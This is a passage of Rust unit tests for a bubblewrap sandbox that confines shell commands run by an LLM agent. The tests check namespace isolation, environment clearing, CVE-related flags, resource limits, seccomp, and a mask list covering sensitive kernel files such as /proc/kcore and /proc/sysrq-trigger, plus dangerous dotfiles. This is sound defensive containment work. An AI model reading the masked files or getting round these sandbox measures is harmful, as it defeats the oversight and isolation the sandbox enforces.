            .rposition(|a| a == "--")
            .expect("no -- before prlimit");
        // Nothing flag-like between the last `--` and prlimit (only
        // flag-like would be `--seccomp <fd>` which is correctly placed
        // before the `--`).
        assert!(prlimit_idx > dashdash_before);
    }

    #[test]
    fn argv_uses_dev_bind_proc_in_fallback_mode() {
        let mut caps = fake_caps();
        caps.pid_namespace = PidNsMode::DevBindFallback;
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        // Must use --dev-bind /proc /proc, NOT --proc /proc.
        assert!(argv.windows(3).any(|w| w == ["--dev-bind", "/proc", "/proc"]));
        assert!(!argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        assert!(!argv.iter().any(|a| a == "--unshare-pid"));
        // SECURITY/CORRECTNESS regression: --as-pid-1 MUST NOT appear in
        // DevBindFallback mode — bwrap rejects it without --unshare-pid,
        // which would cause every sandboxed call to fail with exit=1
        // and a misleading "Specifying --as-pid-1 requires --unshare-pid"
        // message in stderr.
        assert!(
            !argv.iter().any(|a| a == "--as-pid-1"),
            "--as-pid-1 must be gated on --unshare-pid (Strict mode only)"
        );
    }

    #[test]
    fn argv_uses_strict_proc_when_pid_ns_strict() {
        let caps = fake_caps(); // PidNsMode::Strict
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        assert!(argv.iter().any(|a| a == "--unshare-pid"));
        assert!(argv.windows(2).any(|w| w == ["--proc", "/proc"]));
        // Strict mode IS allowed to use --as-pid-1 (and we do).
        assert!(argv.iter().any(|a| a == "--as-pid-1"));
    }

    #[test]
    fn argv_masks_dangerous_proc_files() {
        // G2: /proc/{sysrq-trigger,kcore,kallsyms,kmsg} must be masked over
        // /dev/null in every mode (critical in DevBindFallback, defense in
        // depth in Strict). Regression guard against silently dropping a mask.
        for mode in [PidNsMode::Strict, PidNsMode::DevBindFallback] {
            let mut caps = fake_caps();
            caps.pid_namespace = mode;
            let state = fake_state();
            let ctx = fake_ctx();
            let argv = build_bwrap_argv(
                &caps,
                &state.workspace_root,
                &ctx,
                std::path::Path::new(&state.config.rootfs_path),
                "x",
                std::path::Path::new("/tmp/.sandbox_passwd"),
                std::path::Path::new("/tmp/.sandbox_group"),
                None,
                &fake_limits(),
            );
            for masked in ["/proc/sysrq-trigger", "/proc/kcore", "/proc/kallsyms", "/proc/kmsg"] {
                assert!(
                    argv.windows(3).any(|w| w == ["--ro-bind", "/dev/null", masked]),
                    "mode {mode:?}: must mask {masked} with --ro-bind /dev/null; argv: {argv:?}"
                );
            }
        }
    }

    #[test]
    fn argv_masks_dangerous_dotfiles_at_workspace_root() {
        // Mirrors Anthropic sandbox-runtime's DANGEROUS_FILES protection
        // (sandbox-utils.ts:11-22). Every entry in DANGEROUS_DOTFILES must
        // appear as `--ro-bind /dev/null /home/sandboxuser/<name>` in the argv
        // so an LLM-driven command can neither read the file (sees empty) nor
        // create / overwrite it (EROFS).
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        for dotfile in DANGEROUS_DOTFILES {
            let expected = format!("/home/sandboxuser/{dotfile}");
            assert!(
                argv.windows(3).any(|w| w == ["--ro-bind", "/dev/null", expected.as_str()]),
                "must mask {dotfile} with --ro-bind /dev/null; argv: {argv:?}"
            );
        }
    }

    /// Phase 3 regression test: every security-critical flag must
    /// appear in the production argv. If anyone removes one, this
    /// test fails — preventing silent hardening regressions.
    #[test]
    fn argv_includes_all_security_critical_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "echo hi",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );

        let must_have = [
            "--clearenv",        // env-var exfiltration defense
            "--unshare-user",    // user-namespace isolation
            "--unshare-uts",     // hostname isolation
            "--unshare-ipc",     // IPC isolation
            "--die-with-parent", // child dies on bwrap kill
            "--new-session",     // CVE-2017-5226 / TIOCSTI defense
            "--",                // CVE-2024-32462 arg-injection defense
            "/usr/bin/prlimit",  // rlimit wrapper applied to user code
            "/bin/bash",         // shell (specifically bash, NOT sh)
        ];
        for flag in &must_have {
            assert!(
                argv.iter().any(|a| a == flag),
                "production bwrap argv MUST include {flag}; full argv: {argv:?}"
            );
        }

        // Per-call rlimits must follow prlimit in order.
        let prlimit_idx = argv
            .iter()
            .position(|a| a == "/usr/bin/prlimit")
            .expect("prlimit not found");
        let rlimit_flags = [
            "--nproc=256",
            "--core=0",
            "--nofile=1024",
        ];
        for flag in &rlimit_flags {
            assert!(
                argv[prlimit_idx..].iter().any(|a| a == flag),
                "rlimit flag {flag} missing after prlimit; argv: {argv:?}"
            );
        }
    }

    #[test]
    fn argv_includes_seccomp_fd_only_when_provided() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv_without = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        assert!(!argv_without.iter().any(|a| a == "--seccomp"));

        let argv_with = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            Some(7),
            &fake_limits(),
        );
        assert!(argv_with.windows(2).any(|w| w == ["--seccomp", "7"]));
    }

    #[test]
    fn argv_prlimit_carries_expected_flags() {
        let caps = fake_caps();
        let state = fake_state();
        let ctx = fake_ctx();
        let argv = build_bwrap_argv(
            &caps,
            &state.workspace_root,
            &ctx,
            std::path::Path::new(&state.config.rootfs_path),
            "x",
            std::path::Path::new("/tmp/.sandbox_passwd"),
            std::path::Path::new("/tmp/.sandbox_group"),
            None,
            &fake_limits(),
        );
        let s = argv.join(" ");
        assert!(s.contains("/usr/bin/prlimit"));
        assert!(s.contains("--nproc=256"));
        assert!(s.contains("--core=0"));
        assert!(s.contains("--fsize="));
        assert!(s.contains("--as="));
    }

    #[test]
    fn output_cap_is_one_mib() {
        assert_eq!(OUTPUT_CAP_BYTES, 1024 * 1024);
    }

    #[tokio::test]
    async fn read_capped_truncates_at_one_mib() {
        // 2 MiB of bytes through the reader; expect exactly 1 MiB out.
        let big = vec![b'X'; 2 * 1024 * 1024];
        let cursor = std::io::Cursor::new(big);
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(buf.len(), OUTPUT_CAP_BYTES);
        assert!(truncated);
    }

    #[tokio::test]
    async fn read_capped_passes_through_short_output() {
        let cursor = std::io::Cursor::new(b"hello".to_vec());
        let (buf, truncated) = read_capped_owned(cursor).await;
        assert_eq!(&buf, b"hello");
        assert!(!truncated);
    }
}
